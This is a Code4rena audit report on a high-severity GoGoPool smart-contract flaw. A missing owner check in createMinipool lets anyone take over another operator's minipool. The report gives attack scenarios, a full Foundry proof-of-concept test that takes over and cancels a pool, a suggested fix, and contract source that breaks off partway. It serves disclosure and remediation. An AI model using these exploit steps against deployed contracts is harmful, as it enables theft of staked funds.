{
  "Title": "[H-04] Hijacking of node operators minipool causes loss of staked funds",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L243\n\n\n# Vulnerability details\n\n## Impact\n\nA malicious actor can hijack a minipool of any node operator that finished the validation period or had an error.\n\nThe impacts:\n1. Node operators staked funds will be lost (Loss of funds)\n2. Hacker can hijack the minipool and retrieve rewards without hosting a node. (Theft of yield)\n2.1 See scenario #2 comment for dependencies\n\n## Proof of Concept\n\n\n### Background description\nThe protocol created a state machine that validates transitions between minipool states. For this exploit it is important to understand three states:\n1. `Prelaunch` - This state is the initial state when a minipool is created. The created minipool will have a status of `Prelaunch` until liquid stakers funds are matched and `rialto` stakes 2000 AVAX into Avalanche.\n2. `Withdrawable` - This state is set when the 14 days validation period is over. In this state:\n2.1. `rialto` returned 1000 AVAX to the liquid stakers and handled reward distribution.\n2.2. Node operators can withdraw their staked funds and rewards.\n2.3. If the node operator signed up for a duration longer than 14 days `rialto` will recreate the minipool and stake it for another 14 days.\n3. `Error` - This state is set when `rialto` has an issue to stake the funds in Avalanche\n\nThe state machine allows transitions according the `requireValidStateTransition` function:\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L164\n```\n    function requireValidStateTransition(int256 minipoolIndex, MinipoolStatus to) private view {\n------\n        } else if (currentStatus == MinipoolStatus.Withdrawable || currentStatus == MinipoolStatus.Error) {\n\t\tisValid = (to == MinipoolStatus.Finished || to == MinipoolStatus.Prelaunch);\n\t} else if (currentStatus == MinipoolStatus.Finished || currentStatus == MinipoolStatus.Canceled) {\n\t\t// Once a node is finished/canceled, if they re-validate they go back to beginning state\n\t\tisValid = (to == MinipoolStatus.Prelaunch);\n------\n```\n\nIn the above restrictions, we can see that the following transitions are allowed:\n1.  From `Withdrawable` state to `Prelaunch` state. This transition enables `rialto` to call `recreateMinipool`\n2. From `Finished` state to `Prelaunch` state. This transition allows a node operator to re-use their nodeID to stake again in the protocol.\n3. From `Error` state to `Prelaunch` state. This transition allows a node operator to re-use their nodeID to stake again in the protocol after an error.\n\n#2 is a needed capability, therefore `createMinipool` allows overriding a minipool record if:\n`nodeID` already exists and transition to `Prelaunch` is permitted\n\n`createMinipool`:\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L242\n```\n\tfunction createMinipool(\n\t\taddress nodeID,\n\t\tuint256 duration,\n\t\tuint256 delegationFee,\n\t\tuint256 avaxAssignmentRequest\n\t) external payable whenNotPaused {\n---------\n\t\t// Create or update a minipool record for nodeID\n\t\t// If nodeID exists, only allow overwriting if node is finished or canceled\n\t\t// \t\t(completed its validation period and all rewards paid and processing is complete)\n\t\tint256 minipoolIndex = getIndexOf(nodeID);\n\t\tif (minipoolIndex != -1) {\n\t\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);\n\t\t\tresetMinipoolData(minipoolIndex);\n----------\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Prelaunch));\n----------\n\t\tsetAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".owner\")), msg.sender);\n----------\n\t}\n\n```\nTHE BUG: `createMinipool` can be called by **Anyone** with the `nodeID` of any node operator.\n\nIf `createMinipool` is called at the `Withdrawable` state or `Error` state:\n- The transaction will be allowed \n- The owner of the minipool will be switched to the caller. \n\nTherefore, the minipool is hijacked and the node operator will not be able to withdraw their funds.\n\n### Exploit scenarios\n\nAs shown above, an attacker can **always** hijack the minipool and lock the node operators funds.\n1. Cancel the minipool \n2. Earn rewards on behalf of original NodeOp\n\n#### Scenario #1 - Cancel the minipool\nA hacker can hijack the minipool and immediately cancel the pool after a 14 day period is finished or an error state.\nResults:\n1. Node operator will lose all his staked AVAX\n1.1. This can be done by a malicious actor to **ALL** GoGoPool stakers to lose their funds in a period of 14 days.\n2. Hacker will not lose anything and not gain anything.\n\nConsider the following steps:\n1. Hacker creates a node and creates a minipool `node-1337`. \n2. NodeOp registers a nodeID `node-123` and finished the 14 days stake period. State is `Withdrawable`.\n3. Hacker calls `createMinipool` with `node-123` and deposits 1000 AVAX. Hacker is now owner of the minipool\n4. Hacker calls `cancelMinipool` of `node-123`  and receives his staked 1000 AVAX.\n5. NodeOp cannot withdraw his staked AVAX as NodeOp is no longer the owner.\n6. Hacker can withdraw staked AVAX for both `node-1337` and `node-123`\n\nThe above step #1 is **not** necessary but allow the hacker to immediately cancel the minipool without waiting 5 days\n(See other submitted bug #211: \"Anti griefing mechanism can be bypassed\")\n\n```\n       ┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐\n       │           │               │           │            │           │              │           │\n       │   Rialto  │               │  NodeOp   │            │  Minipool │              │ Hacker    │\n       │           │               │           │            │  Manager  │              │           │\n       └─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘\n             │claimAndInitiate(Node-1337)│                        │createMinipool(Node-1337) │\n             │recordStakingStart(...)    │                        │◄─────────────────────────┤ ┌────────────┐\n             ├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  │\n             │                           │                        │                          │ │ 100 GPP    │\n             │                           │createMinipool(Node-123)│                          │ └────────────┘\n             │claimAndInitiate(Node-123) ├───────────────────────►│                          │\n             │recordStakingStart(...)    │                        │                          │\n             ├───────────────────────────┼───────────────────────►│                          │\n┌──────────┐ │                           │                        │                          │\n│14 days   │ │recordStakingEnd(Node-1337)│                        │                          │\n└──────────┘ │recordStakingEnd(Node-123) │//STATE: WITHDRAWABLE// │                          │ ┌────────────┐\n             ├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  │\n             │                           │                        │createMinipool(Node-123)  │ │Hacker=Owner│\n             │                           │                        │◄─────────────────────────┤ └────────────┘\n             │                           │withdrawMinipoolF..(123)│                          │\n             │                           ├───────────────────────►│cancleMinipool(Node-123)  │\n             │                           │       REVERT!          │◄─────────────────────────┤\n             │                           │◄───────────────────────┤      1000 AVAX           │\n             │                           │                        ├─────────────────────────►│\n             │                           │   ┌────────────────┐   │withdrawMinipoolFunds(1337│ ┌──────────┐\n             │                           │   │  NodeOp loses  │   │◄─────────────────────────┤ │Withdraw  │\n             │                           │   │  his 1000 AVAX │   │      1000 AVAX + REWARDS │ │stake and │\n             │                           │   │  Stake, cannot │   ├─────────────────────────►│ │rewards   │\n             │                           │   │  withdraw      │   │                          │ └──────────┘\n             │                           │   └────────────────┘   │     ┌───────────────┐    │\n             │                           │                        │     │Hacker loses no│    │\n             │                           │                        │     │funds, can     │    │\n             │                           │                        │     │withdraw GPP   │    │\n             │                           │                        │     └───────────────┘    │\n```\n\n#### Scenario #2 - Use node of node operator \n\nIn this scenario the NodeOp registers for a duration longer then 14 days. The hacker will hijack the minipool after 14 days and earn rewards on behalf of the node operators node for the rest of the duration.\nAs the NodeOp registers for a longer period of time, it is likely he will not notice he is not the owner of the minipool and continue to use his node to validate Avalanche. \n\nResults:\n1. Node operator will lose all his staked AVAX\n2. Hacker will gain rewards for staking without hosting a node\n\nImportant to note: \n- This scenario is only possible if `recordStakingEnd` and `recreateMinipool` are **not** called in the same transaction by `rialto`. \n- During the research the sponsor has elaborated that they plan to perform the calls in the same transaction.\n- The sponsor requested to submit issues related to `recordStakingEnd` and `recreateMinipool` single/multi transactions for information and clarity anyway.\n\nConsider the following steps:\n1. Hacker creates a node and creates a minipool `node-1337`. \n2. NodeOp registers a nodeID `node-123` for 28 days duration and finished the 14 days stake period. State is `Withdrawable`.\n3. Hacker calls `createMinipool` with `node-1234` and deposits 1000 AVAX. Hacker is now owner of minipool\n4. Rialto calls `recreateMinipool` to restake the minipool in Avalanche. (This time: the owner is the hacker, the hardware is NodeOp)\n5. 14 days have passed, hacker can withdraw the rewards and 1000 staked AVAX\n6. NodeOps cannot withdraw staked AVAX.\n\n### Foundry POC\n\nThe POC will demonstrate scenario #1.\n\nAdd the following test to `MinipoolManager.t.sol`:\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/MinipoolManager.t.sol#L175\n```\n\tfunction testHijackMinipool() public {\n\t\tuint256 duration = 2 weeks;\n\t\tuint256 depositAmt = 1000 ether;\n\t\tuint256 avaxAssignmentRequest = 1000 ether;\n\t\tuint256 rewards = 10 ether;\n\t\tuint256 expectedRewards = (rewards/2)+(rewards/2).mulWadDown(dao.getMinipoolNodeCommissionFeePct());\n\t\tuint256 validationAmt = depositAmt + avaxAssignmentRequest;\n\t\tuint128 ggpStakeAmt = 100 ether;\n\t\taddress hacker = address(0x1337);\n\t\t// Fund hacker with exact AVAX and gpp\n\t\tvm.deal(hacker, depositAmt*2);\n\t\tdealGGP(hacker, ggpStakeAmt);\n\t\t// Fund nodeOp with exact AVAX and gpp\n\t\tnodeOp = address(0x123);\n\t\tvm.deal(nodeOp, depositAmt);\n\t\tdealGGP(nodeOp, ggpStakeAmt);\n\n\t\t// fund ggAVAX\n\t\taddress lilly = getActorWithTokens(\"lilly\", MAX_AMT, MAX_AMT);\n\t\tvm.prank(lilly);\n\t\tggAVAX.depositAVAX{value: MAX_AMT}();\n\t\tassertEq(lilly.balance, 0);\n\n\t\tvm.startPrank(hacker);\n\t\t// Hacker stakes GGP\n\t\tggp.approve(address(staking), ggpStakeAmt);\n\t\tstaking.stakeGGP(ggpStakeAmt);\n\n\t\t// Create minipool for hacker\n\t\tMinipoolManager.Minipool memory hackerMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);\n\t\tvm.stopPrank();\n\n\t\tvm.startPrank(nodeOp);\n\t\t// nodeOp stakes GGP\n\t\tggp.approve(address(staking), ggpStakeAmt);\n\t\tstaking.stakeGGP(ggpStakeAmt);\n\n\t\t// Create minipool for nodeOp\n\t\tMinipoolManager.Minipool memory nodeOpMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);\n\t\tvm.stopPrank();\n\n\t\t// Rialto stakes both hackers and nodeOp in avalanche \n\t\tvm.startPrank(address(rialto));\n\t\tminipoolMgr.claimAndInitiateStaking(nodeOpMp.nodeID);\n\t\tminipoolMgr.claimAndInitiateStaking(hackerMp.nodeID);\n\n\t\t// Update that staking has started\n\t\tbytes32 txID = keccak256(\"txid\");\n\t\tminipoolMgr.recordStakingStart(nodeOpMp.nodeID, txID, block.timestamp);\n\t\tminipoolMgr.recordStakingStart(hackerMp.nodeID, txID, block.timestamp);\n\n\t\t// Skip 14 days of staking duration\n\t\tskip(duration);\n\n\t\t// Update that staking has ended and funds are withdrawable\n\t\tminipoolMgr.recordStakingEnd{value: validationAmt + rewards}(nodeOpMp.nodeID, block.timestamp, 10 ether);\n\t\tminipoolMgr.recordStakingEnd{value: validationAmt + rewards}(hackerMp.nodeID, block.timestamp, 10 ether);\n\t\tvm.stopPrank();\n\n\t\t/// NOW STATE: WITHDRAWABLE ///\n\n\t\tvm.startPrank(hacker);\n\t\t// Hacker creates a minipool using nodeID of nodeOp\n\t\t// Hacker is now the owner of nodeOp minipool\n\t\tminipoolMgr.createMinipool{value: depositAmt}(nodeOpMp.nodeID, duration, 0.02 ether, avaxAssignmentRequest);\n\n\t\t// Hacker immediatally cancels the nodeOp minipool, validate 1000 AVAX returned\n\t\tminipoolMgr.cancelMinipool(nodeOpMp.nodeID);\n\t\tassertEq(hacker.balance, depositAmt);\n\t\t// Hacker withdraws his own minipool and receives 1000 AVAX + rewards\n\t\tminipoolMgr.withdrawMinipoolFunds(hackerMp.nodeID);\n\t\tassertEq(hacker.balance, depositAmt + depositAmt + expectedRewards);\n\n\t\t// Hacker withdraws his staked ggp\n\t\tstaking.withdrawGGP(ggpStakeAmt);\n\t\tassertEq(ggp.balanceOf(hacker), ggpStakeAmt);\n\t\tvm.stopPrank();\n\n\t\tvm.startPrank(nodeOp);\n\t\t// NodeOp tries to withdraw his funds from the minipool\n\t\t// Transaction reverts because NodeOp is not the owner anymore\n\t\tvm.expectRevert(MinipoolManager.OnlyOwner.selector);\n\t\tminipoolMgr.withdrawMinipoolFunds(nodeOpMp.nodeID);\n\n\t\t// NodeOp can still release his staked gpp\n\t\tstaking.withdrawGGP(ggpStakeAmt);\n\t\tassertEq(ggp.balanceOf(nodeOp), ggpStakeAmt);\n\t\tvm.stopPrank();\n\t}\n```\n\nTo run the POC, execute:\n```\nforge test -m testHijackMinipool -v\n```\n\nExpected output:\n```\nRunning 1 test for test/unit/MinipoolManager.t.sol:MinipoolManagerTest\n[PASS] testHijackMinipool() (gas: 2346280)\nTest result: ok. 1 passed; 0 failed; finished in 9.63s\n```\n## Tools Used\n\nVS Code, Foundry\n\n## Recommended Mitigation Steps\n\nFortunately, the fix is very simple. \nThe reason `createMinipool` is called with an existing `nodeID` is to re-use the `nodeID` again with the protocol. GoGoPool can validate that the owner is the same address as the calling address. GoGoPool have already implemented a function that does this: `onlyOwner(index)`.\n\nConsider placing `onlyOwner(index)` in the following area:\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L243\n```\n\tfunction createMinipool(\n\t\taddress nodeID,\n\t\tuint256 duration,\n\t\tuint256 delegationFee,\n\t\tuint256 avaxAssignmentRequest\n\t) external payable whenNotPaused {\n----------\n\t\tint256 minipoolIndex = getIndexOf(nodeID);\n\t\tif (minipoolIndex != -1) {\n                        onlyOwner(minipoolIndex); // AUDIT: ADDED HERE\n----------\n\t\t} else {\n----------\n\t}\n```",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-12-gogopool-contest",
  "Code": [
    {
      "filename": "contracts/contract/MinipoolManager.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.17;\n\nimport \"./Base.sol\";\nimport {IWithdrawer} from \"../interface/IWithdrawer.sol\";\nimport {MinipoolStatus} from \"../types/MinipoolStatus.sol\";\nimport {MultisigManager} from \"./MultisigManager.sol\";\nimport {Oracle} from \"./Oracle.sol\";\nimport {ProtocolDAO} from \"./ProtocolDAO.sol\";\nimport {Staking} from \"./Staking.sol\";\nimport {Storage} from \"./Storage.sol\";\nimport {TokenggAVAX} from \"./tokens/TokenggAVAX.sol\";\nimport {TokenGGP} from \"./tokens/TokenGGP.sol\";\nimport {Vault} from \"./Vault.sol\";\n\nimport {ERC20} from \"@rari-capital/solmate/src/mixins/ERC4626.sol\";\nimport {FixedPointMathLib} from \"@rari-capital/solmate/src/utils/FixedPointMathLib.sol\";\nimport {ReentrancyGuard} from \"@rari-capital/solmate/src/utils/ReentrancyGuard.sol\";\nimport {SafeTransferLib} from \"@rari-capital/solmate/src/utils/SafeTransferLib.sol\";\n\n/*\n\tData Storage Schema\n\tNodeIDs are 20 bytes so can use Solidity 'address' as storage type for them\n\tNodeIDs can be added, but never removed. If a nodeID submits another validation request,\n\t\tit will overwrite the old one (only allowed for specific statuses).\n\n\tMinipoolManager.TotalAVAXLiquidStakerAmt = total for all active minipools (Prelaunch/Launched/Staking)\n\n\tminipool.count = Starts at 0 and counts up by 1 after a node is added.\n\n\tminipool.index<nodeID> = <index> of nodeID\n\tminipool.item<index>.nodeID = nodeID used as primary key (NOT the ascii \"Node-123...\" but the actual 20 bytes)\n\tminipool.item<index>.status = enum\n\tminipool.item<index>.duration = requested validation duration in seconds (performed as 14 day cycles)\n\tminipool.item<index>.delegationFee = node operator specified fee (must be between 0 and 1 ether) 2% is 0.2 ether\n\tminipool.item<index>.owner = owner address\n\tminipool.item<index>.multisigAddr = which Rialto multisig is assigned to manage this validation\n\tminipool.item<index>.avaxNodeOpAmt = avax deposited by node operator (for this cycle)\n\tminipool.item<index>.avaxNodeOpInitialAmt = avax deposited by node operator for the **first** validation cycle\n\tminipool.item<index>.avaxLiquidStakerAmt = avax deposited by users and assigned to this nodeID\n\n\t// Submitted by the Rialto oracle\n\tminipool.item<index>.txID = transaction id of the AddValidatorTx\n\tminipool.item<index>.initialStartTime = actual time the **first** validation cycle was started\n\tminipool.item<index>.startTime = actual time validation was started\n\tminipool.item<index>.endTime = actual time validation was finished\n\tminipool.item<index>.avaxTotalRewardAmt = Actual total avax rewards paid by avalanchego to the TSS P-chain addr\n\tminipool.item<index>.errorCode = bytes32 that encodes an error msg if something went wrong during launch of minipool\n\n\t// Calculated in recordStakingEnd()\n\tminipool.item<index>.avaxNodeOpRewardAmt\n\tminipool.item<index>.avaxLiquidStakerRewardAmt\n\tminipool.item<index>.ggpSlashAmt = amt of ggp bond that was slashed if necessary (expected reward amt = avaxLiquidStakerAmt * x%/yr / ggpPriceInAvax)\n*/\n\n/// @title Minipool creation and management\ncontract MinipoolManager is Base, ReentrancyGuard, IWithdrawer {\n\tusing FixedPointMathLib for uint256;\n\tusing SafeTransferLib for address;\n\tusing SafeTransferLib for ERC20;\n\n\terror InsufficientGGPCollateralization();\n\terror InsufficientAVAXForMinipoolCreation();\n\terror InvalidAmount();\n\terror InvalidAVAXAssignmentRequest();\n\terror InvalidStartTime();\n\terror InvalidEndTime();\n\terror InvalidMultisigAddress();\n\terror InvalidNodeID();\n\terror InvalidStateTransition();\n\terror MinipoolNotFound();\n\terror OnlyOwner();\n\terror CancellationTooEarly();\n\n\tevent GGPSlashed(address indexed nodeID, uint256 ggp);\n\tevent MinipoolStatusChanged(address indexed nodeID, MinipoolStatus indexed status);\n\n\tERC20 public immutable ggp;\n\tTokenggAVAX public immutable ggAVAX;\n\n\t/// @dev Not used for storage, just for returning data from view functions\n\tstruct Minipool {\n\t\tint256 index;\n\t\taddress nodeID;\n\t\tuint256 status;\n\t\tuint256 duration;\n\t\tuint256 delegationFee;\n\t\taddress owner;\n\t\taddress multisigAddr;\n\t\tuint256 avaxNodeOpAmt;\n\t\tuint256 avaxNodeOpInitialAmt;\n\t\tuint256 avaxLiquidStakerAmt;\n\t\t// Submitted by the Rialto Oracle\n\t\tbytes32 txID;\n\t\tuint256 initialStartTime;\n\t\tuint256 startTime;\n\t\tuint256 endTime;\n\t\tuint256 avaxTotalRewardAmt;\n\t\tbytes32 errorCode;\n\t\t// Calculated in recordStakingEnd\n\t\tuint256 ggpSlashAmt;\n\t\tuint256 avaxNodeOpRewardAmt;\n\t\tuint256 avaxLiquidStakerRewardAmt;\n\t}\n\n\tfunction receiveWithdrawalAVAX() external payable {}\n\n\t//\n\t// GUARDS\n\t//\n\n\t/// @notice Look up minipool owner by minipool index\n\t/// @param minipoolIndex A valid minipool index\n\t/// @return minipool owner or revert\n\tfunction onlyOwner(int256 minipoolIndex) private view returns (address) {\n\t\taddress owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".owner\")));\n\t\tif (msg.sender != owner) {\n\t\t\trevert OnlyOwner();\n\t\t}\n\t\treturn owner;\n\t}\n\n\t/// @notice Verifies the multisig trying to use the given node ID is valid\n\t/// @dev Look up multisig index by minipool nodeID\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @return minipool index or revert\n\tfunction onlyValidMultisig(address nodeID) private view returns (int256) {\n\t\tint256 minipoolIndex = requireValidMinipool(nodeID);\n\n\t\taddress assignedMultisig = getAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".multisigAddr\")));\n\t\tif (msg.sender != assignedMultisig) {\n\t\t\trevert InvalidMultisigAddress();\n\t\t}\n\t\treturn minipoolIndex;\n\t}\n\n\t/// @notice Look up minipool index by minipool nodeID\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @return minipool index or revert\n\tfunction requireValidMinipool(address nodeID) private view returns (int256) {\n\t\tint256 minipoolIndex = getIndexOf(nodeID);\n\t\tif (minipoolIndex == -1) {\n\t\t\trevert MinipoolNotFound();\n\t\t}\n\n\t\treturn minipoolIndex;\n\t}\n\n\t/// @notice Ensure a minipool is allowed to move to the \"to\" state\n\t/// @param minipoolIndex A valid minipool index\n\t/// @param to New status\n\tfunction requireValidStateTransition(int256 minipoolIndex, MinipoolStatus to) private view {\n\t\tbytes32 statusKey = keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\"));\n\t\tMinipoolStatus currentStatus = MinipoolStatus(getUint(statusKey));\n\t\tbool isValid;\n\n\t\tif (currentStatus == MinipoolStatus.Prelaunch) {\n\t\t\tisValid = (to == MinipoolStatus.Launched || to == MinipoolStatus.Canceled);\n\t\t} else if (currentStatus == MinipoolStatus.Launched) {\n\t\t\tisValid = (to == MinipoolStatus.Staking || to == MinipoolStatus.Error);\n\t\t} else if (currentStatus == MinipoolStatus.Staking) {\n\t\t\tisValid = (to == MinipoolStatus.Withdrawable || to == MinipoolStatus.Error);\n\t\t} else if (currentStatus == MinipoolStatus.Withdrawable || currentStatus == MinipoolStatus.Error) {\n\t\t\tisValid = (to == MinipoolStatus.Finished || to == MinipoolStatus.Prelaunch);\n\t\t} else if (currentStatus == MinipoolStatus.Finished || currentStatus == MinipoolStatus.Canceled) {\n\t\t\t// Once a node is finished/canceled, if they re-validate they go back to beginning state\n\t\t\tisValid = (to == MinipoolStatus.Prelaunch);\n\t\t} else {\n\t\t\tisValid = false;\n\t\t}\n\n\t\tif (!isValid) {\n\t\t\trevert InvalidStateTransition();\n\t\t}\n\t}\n\n\tconstructor(\n\t\tStorage storageAddress,\n\t\tERC20 ggp_,\n\t\tTokenggAVAX ggAVAX_\n\t) Base(storageAddress) {\n\t\tversion = 1;\n\t\tggp = ggp_;\n\t\tggAVAX = ggAVAX_;\n\t}\n\n\t//\n\t// OWNER FUNCTIONS\n\t//\n\n\t/// @notice Accept AVAX deposit from node operator to create a Minipool. Node Operator must be staking GGP. Open to public.\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @param duration Requested validation period in seconds\n\t/// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)\n\t/// @param avaxAssignmentRequest Amount of requested AVAX to be matched for this Minipool\n\tfunction createMinipool(\n\t\taddress nodeID,\n\t\tuint256 duration,\n\t\tuint256 delegationFee,\n\t\tuint256 avaxAssignmentRequest\n\t) external payable whenNotPaused {\n\t\tif (nodeID == address(0)) {\n\t\t\trevert InvalidNodeID();\n\t\t}\n\n\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(\"ProtocolDAO\"));\n\t\tif (\n\t\t\t// Current rule is matched funds must be 1:1 nodeOp:LiqStaker\n\t\t\tmsg.value != avaxAssignmentRequest ||\n\t\t\tavaxAssignmentRequest > dao.getMinipoolMaxAVAXAssignment() ||\n\t\t\tavaxAssignmentRequest < dao.getMinipoolMinAVAXAssignment()\n\t\t) {\n\t\t\trevert InvalidAVAXAssignmentRequest();\n\t\t}\n\n\t\tif (msg.value + avaxAssignmentRequest < dao.getMinipoolMinAVAXStakingAmt()) {\n\t\t\trevert InsufficientAVAXForMinipoolCreation();\n\t\t}\n\n\t\tStaking staking = Staking(getContractAddress(\"Staking\"));\n\t\tstaking.increaseMinipoolCount(msg.sender);\n\t\tstaking.increaseAVAXStake(msg.sender, msg.value);\n\t\tstaking.increaseAVAXAssigned(msg.sender, avaxAssignmentRequest);\n\n\t\tif (staking.getRewardsStartTime(msg.sender) == 0) {\n\t\t\tstaking.setRewardsStartTime(msg.sender, block.timestamp);\n\t\t}\n\n\t\tuint256 ratio = staking.getCollateralizationRatio(msg.sender);\n\t\tif (ratio < dao.getMinCollateralizationRatio()) {\n\t\t\trevert InsufficientGGPCollateralization();\n\t\t}\n\n\t\t// Get a Rialto multisig to assign for this minipool\n\t\tMultisigManager multisigManager = MultisigManager(getContractAddress(\"MultisigManager\"));\n\t\taddress multisig = multisigManager.requireNextActiveMultisig();\n\n\t\t// Create or update a minipool record for nodeID\n\t\t// If nodeID exists, only allow overwriting if node is finished or canceled\n\t\t// \t\t(completed its validation period and all rewards paid and processing is complete)\n\t\tint256 minipoolIndex = getIndexOf(nodeID);\n\t\tif (minipoolIndex != -1) {\n\t\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);\n\t\t\tresetMinipoolData(minipoolIndex);\n\t\t\t// Also reset initialStartTime as we are starting a whole new validation\n\t\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".initialStartTime\")), 0);\n\t\t} else {\n\t\t\tminipoolIndex = int256(getUint(keccak256(\"minipool.count\")));\n\t\t\t// The minipoolIndex is stored 1 greater than actual value. The 1 is subtracted in getIndexOf()\n\t\t\tsetUint(keccak256(abi.encodePacked(\"minipool.index\", nodeID)), uint256(minipoolIndex + 1));\n\t\t\tsetAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".nodeID\")), nodeID);\n\t\t\taddUint(keccak256(\"minipool.count\"), 1);\n\t\t}\n\n\t\t// Save the attrs individually in the k/v store\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Prelaunch));\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".duration\")), duration);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".delegationFee\")), delegationFee);\n\t\tsetAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".owner\")), msg.sender);\n\t\tsetAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".multisigAddr\")), multisig);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpInitialAmt\")), msg.value);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpAmt\")), msg.value);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\")), avaxAssignmentRequest);\n\n\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);\n\n\t\tVault vault = Vault(getContractAddress(\"Vault\"));\n\t\tvault.depositAVAX{value: msg.value}();\n\t}\n\n\t/// @notice Owner of a minipool can cancel the (prelaunch) minipool\n\t/// @param nodeID 20-byte Avalanche node ID the Owner registered with\n\tfunction cancelMinipool(address nodeID) external nonReentrant {\n\t\tStaking staking = Staking(getContractAddress(\"Staking\"));\n\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(\"ProtocolDAO\"));\n\t\tint256 index = requireValidMinipool(nodeID);\n\t\tonlyOwner(index);\n\t\t// make sure they meet the wait period requirement\n\t\tif (block.timestamp - staking.getRewardsStartTime(msg.sender) < dao.getMinipoolCancelMoratoriumSeconds()) {\n\t\t\trevert CancellationTooEarly();\n\t\t}\n\t\t_cancelMinipoolAndReturnFunds(nodeID, index);\n\t}\n\n\t/// @notice Withdraw function for a Node Operator to claim all AVAX funds they are due (original AVAX staked, plus any AVAX rewards)\n\t/// @param nodeID 20-byte Avalanche node ID the Node Operator registered with\n\tfunction withdrawMinipoolFunds(address nodeID) external nonReentrant {\n\t\tint256 minipoolIndex = requireValidMinipool(nodeID);\n\t\taddress owner = onlyOwner(minipoolIndex);\n\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Finished);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Finished));\n\n\t\tuint256 avaxNodeOpAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpAmt\")));\n\t\tuint256 avaxNodeOpRewardAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpRewardAmt\")));\n\t\tuint256 totalAvaxAmt = avaxNodeOpAmt + avaxNodeOpRewardAmt;\n\n\t\tStaking staking = Staking(getContractAddress(\"Staking\"));\n\t\tstaking.decreaseAVAXStake(owner, avaxNodeOpAmt);\n\n\t\tVault vault = Vault(getContractAddress(\"Vault\"));\n\t\tvault.withdrawAVAX(totalAvaxAmt);\n\t\towner.safeTransferETH(totalAvaxAmt);\n\t}\n\n\t//\n\t// RIALTO FUNCTIONS\n\t//\n\n\t/// @notice Verifies that the minipool related the the given node ID is able to a validator\n\t/// @dev Rialto calls this to see if a claim would succeed. Does not change state.\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @return boolean representing if the minipool can become a validator\n\tfunction canClaimAndInitiateStaking(address nodeID) external view returns (bool) {\n\t\tint256 minipoolIndex = onlyValidMultisig(nodeID);\n\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Launched);\n\n\t\tuint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\")));\n\t\treturn avaxLiquidStakerAmt <= ggAVAX.amountAvailableForStaking();\n\t}\n\n\t/// @notice Removes the AVAX associated with a minipool from the protocol to stake it on Avalanche and register the node as a validator\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @dev Rialto calls this to initiate registering a minipool for staking and validation of the P-chain.\n\tfunction claimAndInitiateStaking(address nodeID) external {\n\t\tint256 minipoolIndex = onlyValidMultisig(nodeID);\n\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Launched);\n\n\t\tuint256 avaxNodeOpAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpAmt\")));\n\t\tuint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\")));\n\n\t\t// Transfer funds to this contract and then send to multisig\n\t\tggAVAX.withdrawForStaking(avaxLiquidStakerAmt);\n\t\taddUint(keccak256(\"MinipoolManager.TotalAVAXLiquidStakerAmt\"), 